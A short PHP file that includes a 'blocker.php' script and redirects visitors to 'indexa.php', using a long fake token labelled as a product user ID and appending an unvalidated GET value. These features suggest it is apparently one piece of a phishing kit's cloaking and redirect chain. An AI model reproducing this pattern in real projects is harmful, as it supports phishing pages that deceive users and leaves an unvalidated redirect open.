<?php 
include('blocker.php');

if(isset($_GET['u_1']))
{
		$fr2 = $_GET['u_1'];

	header('Location: indexa.php?P=_93894574342hdfjsixaoweue5_j1489738549283781331983743fncn_Product-UserID&u_1='.$fr2);
    exit;
}
	
?>